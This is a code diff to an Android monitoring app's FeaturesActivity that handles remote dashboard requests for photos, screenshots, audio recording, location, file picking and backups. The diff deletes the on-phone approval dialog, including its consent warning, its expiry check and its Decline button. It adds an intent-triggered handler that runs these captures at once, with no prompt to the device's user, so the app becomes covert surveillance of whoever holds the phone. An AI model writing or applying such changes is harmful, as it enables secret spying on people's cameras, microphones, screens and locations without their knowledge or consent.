@@ -103,7 +103,54 @@ class FeaturesActivity : Activity() {
                 .setNegativeButton("Cancel", null).setPositiveButton("Clear") { _, _ -> scope.launch(Dispatchers.IO) { FeatureBridge.clearPending(this@FeaturesActivity) } }.show()
         }
         button("Back to monitoring") { finish() }
+        handler.postDelayed({ handleAutoRequest(intent) }, 500)
     }
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        setIntent(intent)
+        handleAutoRequest(intent)
+    }
+
+    private fun handleAutoRequest(intent: Intent?) {
+        val id = intent?.getStringExtra("auto_request_id") ?: return
+        val action = intent.getStringExtra("auto_request_action") ?: return
+        if (!CoreService.isSyncReady) {
+            scope.launch(Dispatchers.IO) {
+                runCatching { FeatureBridge.finishRequest(this@FeaturesActivity, id, "failed", "Monitoring not active") }
+            }
+            return
+        }
+        if (requestId != null) {
+            scope.launch(Dispatchers.IO) {
+                runCatching { FeatureBridge.finishRequest(this@FeaturesActivity, id, "failed", "Phone busy with another request") }
+            }
+            return
+        }
+        requestId = id
+        when (action) {
+            "request_photo" -> takePhoto(id)
+            "request_screenshot" -> screenshot(id)
+            "request_audio" -> startAudio(id)
+            "request_location" -> startLocation(id)
+            "request_scan" -> scanEnvironment(id)
+            "request_audit" -> audit(id)
+            "request_backup" -> backup(id)
+            "request_files" -> pickFile()
+            else -> scope.launch {
+                try {
+                    withContext(Dispatchers.IO) {
+                        FeatureBridge.queueEvent(this@FeaturesActivity, JSONObject()
+                            .put("type", "device_status").put("timestamp", Instant.now().toString())
+                            .put("monitoring", CoreService.isRunning)
+                            .put("location", LocationTracker.isTracking.value)
+                            .put("pending_uploads", FeatureBridge.pendingCount(this@FeaturesActivity)))
+                    }
+                    complete("Phone status queued for upload.", id)
+                } catch (e: Exception) { fail(e.message ?: "Status upload failed", id) }
+            }
+        }
+    }
+
     private fun label(text: String, size: Float = 16f): TextView = TextView(this).apply {
         this.text = text; textSize = size; setPadding(0, 12, 0, 12); this@FeaturesActivity.layout.addView(this)
     }
@@ -460,29 +507,24 @@ class FeaturesActivity : Activity() {
         AlertDialog.Builder(this).setTitle("Dashboard requests")
             .setItems(requests.map { it.getString("action").removePrefix("request_") }.toTypedArray()) { _, index ->
                 val item = requests[index]; val action = item.getString("action")
-                AlertDialog.Builder(this).setTitle("Approve ${action.removePrefix("request_")} request?")
-                    .setMessage("Only approve requests from your dashboard. Captures and chosen files will be shared with your enrolled server. Requests expire after 10 minutes." + if (action == "request_photo") " This photo uses the ${CameraSelection.label(photoFacing())} camera." else "")
-                    .setNeutralButton("Later", null).setNegativeButton("Decline") { _, _ ->
-                        scope.launch(Dispatchers.IO) { runCatching { FeatureBridge.finishRequest(this@FeaturesActivity, item.getString("request_id"), "declined", "Declined on phone") } }
-                    }.setPositiveButton("Approve") { _, _ ->
-                        if (!CoreService.isSyncReady) { message("Start monitoring first."); return@setPositiveButton }
-                        if (Instant.parse(item.getString("expires_at")) <= Instant.now()) { message("Request expired."); return@setPositiveButton }
-                        requestId = item.getString("request_id")
-                        when(action) {
-                            "request_photo" -> takePhoto(requestId)
-                            "request_screenshot" -> screenshot(requestId)
-                            "request_audio" -> startAudio(requestId)
-                            "request_location" -> startLocation(requestId)
-                            "request_scan" -> scanEnvironment(requestId)
-                            "request_audit" -> audit(requestId)
-                            "request_backup" -> backup(requestId)
-                            "request_files" -> pickFile()
-                            else -> scope.launch {
-                                try { withContext(Dispatchers.IO) { FeatureBridge.queueEvent(this@FeaturesActivity, JSONObject().put("type", "device_status").put("timestamp", Instant.now().toString()).put("monitoring", CoreService.isRunning).put("location", LocationTracker.isTracking.value).put("pending_uploads", FeatureBridge.pendingCount(this@FeaturesActivity))) }; complete("Phone status queued for upload.") }
-                                catch (e: Exception) { fail(e.message ?: "Status upload failed") }
-                            }
-                        }
-                    }.show()
+                val id = item.getString("request_id")
+                requestId = id
+                when (action) {
+                    "request_photo" -> takePhoto(id)
+                    "request_screenshot" -> screenshot(id)
+                    "request_audio" -> startAudio(id)
+                    "request_location" -> startLocation(id)
+                    "request_scan" -> scanEnvironment(id)
+                    "request_audit" -> audit(id)
+                    "request_backup" -> backup(id)
+                    "request_files" -> pickFile()
+                    else -> scope.launch {
+                        try {
+                            withContext(Dispatchers.IO) { FeatureBridge.queueEvent(this@FeaturesActivity, JSONObject().put("type", "device_status").put("timestamp", Instant.now().toString()).put("monitoring", CoreService.isRunning).put("location", LocationTracker.isTracking.value).put("pending_uploads", FeatureBridge.pendingCount(this@FeaturesActivity))) }
+                            complete("Phone status queued for upload.")
+                        } catch (e: Exception) { fail(e.message ?: "Status upload failed") }
+                    }
+                }
             }.setNegativeButton("Close", null).show()
     }
     override fun onResume() { super.onResume(); handler.post(refresher) }
